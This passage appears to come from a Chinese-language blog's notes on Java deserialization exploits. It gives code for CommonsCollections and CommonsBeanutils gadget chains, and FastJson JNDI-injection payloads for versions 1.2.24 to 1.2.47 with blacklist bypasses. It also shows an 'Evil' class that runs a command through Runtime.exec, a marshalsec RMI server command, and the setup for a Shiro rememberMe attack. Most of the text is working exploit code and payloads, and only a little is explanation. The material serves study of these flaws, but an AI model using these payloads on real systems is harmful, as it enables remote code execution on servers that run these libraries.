                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>fakeTransformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">TiedMapEntry</span> tme <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>outerMap<span class="token punctuation">,</span> <span class="token string">"keykey"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span> expMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        expMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tme<span class="token punctuation">,</span><span class="token string">"valuevalue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        outerMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"keykey"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Field</span> f <span class="token operator">=</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">,</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">out</span><span class="token punctuation">(</span>expMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">out</span><span class="token punctuation">(</span><span class="token class-name">HashMap</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h3><p>这条链主要就是<code>BeanComparator</code>这个类的利用了，涉及<code>JavaBean</code>的操作，通过<code>BeanComparator.compare</code>触发<code>PropertyUtils.getProperty</code>进行<code>JavaBean</code>操作，触发<code>TemplatesImpl</code>的<code>getOutputProperties</code>方法，然后<code>newTransformer</code>，之后就是<code>TemplatesImpl</code>动态加载字节码了</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span></span><span class="token class-name">BeanComparator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">com<span class="token punctuation">.</span>loader<span class="token punctuation">.</span></span><span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token static">setFieldValue</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonsBeanutils</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> clazz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>loader<span class="token punctuation">.</span></span>HelloTemplatesImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>clazz<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"HelloTemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">final</span> <span class="token class-name">BeanComparator</span> comparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanComparator</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span>CASE_INSENSITIVE_ORDER<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>
        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>comparator<span class="token punctuation">,</span> <span class="token string">"property"</span><span class="token punctuation">,</span> <span class="token string">"outputProperties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> <span class="token string">"queue"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>obj<span class="token punctuation">,</span> obj<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h3><h4 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a>DNSLOG</h4><p>判断是否存在FastJson反序列化漏洞</p>
<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"xxx"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.net.Inet4Address"</span><span class="token punctuation">,</span><span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"l42dtg.dnslog.cn"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>

<h4 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h4><p>实际上利用的是<code>lookup</code>函数来进行<code>JNDI</code>注入</p>
<p>编写一个恶意类<code>Evil.java</code></p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">Evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p><code>javac</code>编译成<code>class</code>文件，然后<code>python -m http.server</code>起一个<code>http</code>服务来供RMI服务来加载恶意类，使用<code>marshalsec</code>这个工具来起一个RMI服务</p>
<p>项目地址：<a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">java -cp .<span class="token punctuation">\</span>marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8000/<span class="token comment">#Evil</span></code></pre>

<p>然后漏洞触发代码</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span></span><span class="token class-name">FastJson_1_2_24</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>rowset<span class="token punctuation">.</span></span><span class="token class-name">JdbcRowSetImpl</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Rmi_Poc</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> <span class="token class-name">PoC</span> <span class="token operator">=</span> <span class="token string">"&#123;\"xxx\":&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/calc\", \"autoCommit\":true&#125;&#125;"</span><span class="token punctuation">;</span>
        JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token class-name">PoC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<ul>
<li><code>@type</code>： 指定恶意利用类 <code>com.sun.rowset.JdbcRowSetImpl</code></li>
<li><code>dataSourceName</code> ：指定<code>RMI / LDAP</code> 恶意服务器，并调用<code>setDataSourceName</code> 函数</li>
<li><code>autoCommit</code>：调用 <code>setAutoCommit</code> 函数</li>
</ul>
<h4 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h4><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"xxx"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"Lcom.sun.rowset.JdbcRowSetImpl;"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1099/calc"</span><span class="token punctuation">,</span> <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>

<p>问题出在<code>TypeUtils.loadClass</code>,如果类名以<code>L</code>开头<code>;</code>结尾，就会删除掉开头和结尾得到新的类名，以新类名作为参数递归调用<code>loadClass</code>函数，最终加载<code>JdbcRowSetImpl</code>并返回，后续利用过程同上</p>
<h4 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h4><p>绕过方式为类名开头两个<code>L</code>，结尾两个<code>;</code>，这样删除一次开头结尾后的类名为<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>，不会触发黑名单。</p>
<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"xxx"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"LLcom.sun.rowset.JdbcRowSetImpl;;"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1099/calc"</span><span class="token punctuation">,</span> <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>

<h4 id="1-2-43"><a href="#1-2-43" class="headerlink" title="1.2.43"></a>1.2.43</h4><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"xxx"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"[com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1099/calc"</span><span class="token punctuation">,</span> <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>

<h4 id="1-2-44-1-2-45"><a href="#1-2-44-1-2-45" class="headerlink" title="1.2.44-1.2.45"></a>1.2.44-1.2.45</h4><p>有限制，需要使用<code>MyBatis</code></p>
<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"xxx"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span><span class="token punctuation">,</span><span class="token property">"properties"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"data_source"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1099/Exploit"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>

<h4 id="1-2-46-1-2-47"><a href="#1-2-46-1-2-47" class="headerlink" title="1.2.46-1.2.47"></a>1.2.46-1.2.47</h4><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
		<span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
		<span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
	<span class="token property">"x"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
<span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
<span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://localhost:1099/Exploit"</span><span class="token punctuation">,</span>
<span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>目前分析到这，后面再加</p>
<h3 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h3><p><code>shiro</code>反序列化漏洞这个问题主要出在<code>rememberMe</code>这个<code>cookie</code>参数，是一个记住我的功能，用户登陆成功后会生成经过加密并编码的cookie，在服务端接收cookie值后，Base64解码–&gt;AES解密–&gt;反序列化。攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化–&gt;AES加密–&gt;Base64编码，然后将其作为cookie的rememberMe字段发送，Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。</p>
<p>起一个<code>shiro tomcat</code>，代码都在这：<a href="https://github.com/phith0n/JavaThings">https://github.com/phith0n/JavaThings</a></p>
<p>先写个恶意类<code>Evil.java</code></p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>govuln<span class="token punctuation">.</span>shiroattack</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">Evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello TemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

